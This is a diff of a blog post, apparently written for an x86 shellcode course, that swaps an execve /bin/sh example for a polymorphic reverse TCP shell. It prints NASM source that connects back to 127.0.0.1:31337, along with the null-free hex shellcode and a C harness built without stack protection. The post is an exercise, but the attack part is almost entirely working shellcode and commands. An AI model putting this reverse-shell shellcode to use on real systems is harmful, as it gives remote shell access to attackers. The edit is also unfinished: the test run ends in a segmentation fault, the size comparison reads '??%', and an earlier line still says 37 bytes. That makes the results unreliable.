@@ -37,7 +37,7 @@ The 3 Shell-Storm references that will be modified:
 #### 1st Shellcode (Execve /bin/sh)
 --------
 
-The execve shellcode will spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell on the local host. 
+The Execve shellcode will spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell on the local host. 
 
 Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-811.php] [execve-shellstorm]:
 
@@ -202,7 +202,7 @@ The C program is compiled as an executable binary with stack-protection disabled
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final
-osboxes@osboxes:~/Downloads/SLAE/Assignment_6$ ./execve_poly_final 
+osboxes@osboxes:~/Downloads/SLAE$ ./execve_poly_final 
 Shellcode length:  37
 $ id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
@@ -312,13 +312,14 @@ main()
 
 The polymorphic (modified) version of the original shellcode is scripted in Assembly:
 
-```nasm
-; Filename: execve_poly.nasm
+```nasm 
+; Filename: revtcpshell_poly.nasm
 ; Author: h3ll0clar1c3
-; Purpose: Spawn a shell on the local host
-; Compilation: ./compile.sh execve_poly
-; Usage: ./execve_poly
-; Shellcode size: 37 bytes
+; Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 31337
+; Compilation: ./compile.sh revtcpshell_poly
+; Usage: ./revtcpshell_poly
+; Testing: nc -lv 31337
+; Shellcode size: 105 bytes
 ; Architecture: x86
 
 global   _start
@@ -326,74 +327,81 @@ global   _start
 section .text
         _start:
 
-        xor edx, edx                    ; initialize register // changed the register value
-        push edx                        ; push edx onto the stack // changed the register value
-        mov eax, 0x463ED8B7             ; move 0x463ED8B7 into eax // split to add up to original value /bin/sh
-        add eax, 0x22345678             ; move 0x22345678 into eax // split to add up to original value /bin/sh
-        push eax                        ; push eax onto the stack // added instruction
-        mov eax, 0xDEADC0DE             ; move 0xDEADC0DE into eax // split to add up to original value /bin/sh
-        sub eax, 0x70445EAF             ; move 0x70445EAF into eax // split to add up to original value /bin/sh
-        push eax                        ; push eax onto the stack // added instruction
-        push byte 0xb                   ; push 0xb onto the stack // changed the method
-        pop eax                         ; pop eax off the stack // added instruction
-        mov ecx, edx                    ; move edx into ecx // changed the register value
-        mov ebx, esp                    ; move esp into ebx // changed the order
-        push byte 0x1                   ; push 0x1 onto the stack // added instruction
-        pop esi                         ; pop esi off the stack // added instruction
-        int 0x80                        ; call the interrupt to execute the execve syscall, /bin/sh shell
+	sub eax, eax			; initialize register // changed the method
+	sub ebx, ebx			; initialize register // changed the method
+	sub ecx, ecx			; initialize register // changed the method
+	sub edx, edx			; initialize register // changed the method
+
+	add al, 0x66			; add 0x66 to al // changed the method
+	inc bl				; increase bl by 0x1 // changed the method
+	push ecx			; push ecx onto the stack 
+	mov byte [esp-8], 0x2		; move 0x2 into esp-8 // changed the order
+	mov byte [esp], 0x6		; move 0x6 into esp 
+	mov byte [esp-4], 0x1		; move 0x1 into esp-4
+	sub esp, 0x8			; adjust stack pointer	
+	push esp 			; push esp onto the stack
+	pop ecx				; pop ecx off the stack
+	int 0x80			; call the interrupt to execute the 1st syscall
+	mov esi, eax			; move eax into esi
+	mov al, 0x66			; move 0x66 into al
+	inc bl				; increase bl
+
+	mov dword [esp], 0x0101017f	; ip address
+	sub esp, 0x8			; substitute 0x8 with esp
+	push word 0x697a		; port
+	push bx				; push bx onto the stack
+	add bl, 0x1			; move 0x1 into bl
+	mov ecx, esp			; move esp into ecx
+	push 0x10			; push 0x10 onto the stack
+	push ecx			; push ecx onto the stack
+	push esi			; push esi onto the stack
+	push esp			; push esp onto the stack
+	pop ecx				; pop ecx off the stack
+	int 0x80			; call the interrupt to execute the 2nd syscall
+	sub ecx, ecx			; substitute ecx with ecx, initialize register
+	pop ecx				; pop ecx off the stack
+
+	loop_dup2:
+	mov al, 0x3f			; move 0x3f into al // changed the order
+	dec cl				; decrement cl
+	int 0x80			; call the interrupt to execute the 3rd syscall
+	jns loop_dup2			; repeat for 1,0
+	sub eax, eax 			; substitute eax with eax, initialize register
+	push edx			; push edx onto the stack
+	push 0x68732f6e			; push the end of "//bin/sh", 'hs/n'
+	push 0x69622f2f			; push the beginning of "//bin/sh", 'ib//'
+	push esp			; push esp onto the stack
+	pop ebx				; pop ebx off the stack
+	push edx			; push edx onto the stack
+	push ebx			; push ebx onto the stack
+	push esp 			; push esp onto the stack
+	pop ecx				; pop ecx off the stack
+	push edx			; push edx onto the stack
+	push esp			; push esp onto the stack
+	pop edx				; pop edx off the stack
+	add al, 0xb			; add 0xb to al
+	int 0x80			; call the interrupt to execute the 4th syscall
 ```
 
-The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:
+The Assembly code is compiled by assembling with Nasm, and compiled as an executable binary.
+
+Objdump is used to extract the shellcode from the Reverse TCP shell in hex format (Null free):
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
-#!/bin/bash
-
-echo '[+] Assembling with Nasm ... '
-nasm -f elf32 -o $1.o $1.nasm
-
-echo '[+] Linking ...'
-ld -o $1 $1.o
-
-echo '[+] Done!'
-```
-
-The Assembly code compiled as an executable binary:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh execve_poly
-[+] Assembling with Nasm ... 
-[+] Linking ...
-[+] Done!
-```
-
-The compiled binary is executed:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ ./execve_poly 
-$ id
-uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
-$ 
-```
-
-Objdump is used to extract the shellcode from the Execve shell in hex format (Null free):
-
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./execve_poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
-"\x31\xd2\x52\xb8\xb7\xd8\x3e\x46\x05\x78\x56\x34\x22\x50\xb8\xde\xc0\xad\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80"
+osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./revtcpshell_poly | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
+"\x29\xc0\x29\xdb\x29\xc9\x29\xd2\x04\x66\xfe\xc3\x51\xc6\x44\x24\xf8\x02\xc6\x04\x24\x06\xc6\x44\x24\xfc\x01\x83\xec\x08\x54\x59\xcd\x80\x89\xc6\xb0\x66\xfe\xc3\xc7\x04\x24\x7f\x01\x01\x83\xec\x08\x66\x68\x7a\x69\x66\x53\x80\xc3\x01\x89\xe1\x6a\x10\x51\x56\x54\x59\xcd\x80\x29\xc9\x59\xb0\x3f\xfe\xc9\xcd\x80\x79\xf8\x29\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x54\x5b\x52\x53\x54\x59\x52\x54\x5a\x04\x0b\xcd\x80" 
 ```
 
 A C program scripted with the newly generated shellcode:
 
 ```c 
 /**
-* Filename: execve_poly_shellcode.c
+* Filename: revtcpshell_poly_shellcode.c
 * Author: h3ll0clar1c3
-* Purpose: Spawn a shell on the local host   
-* Compilation: gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final  
-* Usage: ./execve_poly_final
-* Shellcode size: 37 bytes
+* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 31337   
+* Compilation: gcc -fno-stack-protector -z execstack -m32 revtcpshell_poly_shellcode.c -o revtcpshell_poly_final
+* Usage: ./revtcpshell_poly_final
+* Shellcode size: 105 bytes
 * Architecture: x86
 **/
 
@@ -401,8 +409,11 @@ A C program scripted with the newly generated shellcode:
 #include <string.h>
 
 unsigned char code[] = \
-"\x31\xd2\x52\xb8\xb7\xd8\x3e\x46\x05\x78\x56\x34\x22\x50\xb8\xde\xc0\xad"
-"\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80";
+"\x29\xc0\x29\xdb\x29\xc9\x29\xd2\x04\x66\xfe\xc3\x51\xc6\x44\x24\xf8\x02\xc6\x04\x24"
+"\x06\xc6\x44\x24\xfc\x01\x83\xec\x08\x54\x59\xcd\x80\x89\xc6\xb0\x66\xfe\xc3\xc7\x04"
+"\x24\x7f\x01\x01\x83\xec\x08\x66\x68\x7a\x69\x66\x53\x80\xc3\x01\x89\xe1\x6a\x10\x51"
+"\x56\x54\x59\xcd\x80\x29\xc9\x59\xb0\x3f\xfe\xc9\xcd\x80\x79\xf8\x29\xc0\x52\x68\x6e"
+"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x54\x5b\x52\x53\x54\x59\x52\x54\x5a\x04\x0b\xcd\x80";
 
 int main()
 {
@@ -415,15 +426,14 @@ int main()
 The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 37 bytes:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final
-osboxes@osboxes:~/Downloads/SLAE/Assignment_6$ ./execve_poly_final 
-Shellcode length:  37
-$ id
-uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
-$ 
+osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 revtcpshell_poly_shellcode.c -o revtcpshell_poly_final
+osboxes@osboxes:~/Downloads/SLAE$ ./revtcpshell_poly_final 
+Shellcode length:  105
+Segmentation fault (core dumped)
+
 ```
 
-The polymorphic version of the shellcode is 32% larger in size compared to the original reference from Shell-Storm.
+The polymorphic version of the shellcode is ??% larger in size compared to the original reference from Shell-Storm.
 
 
 
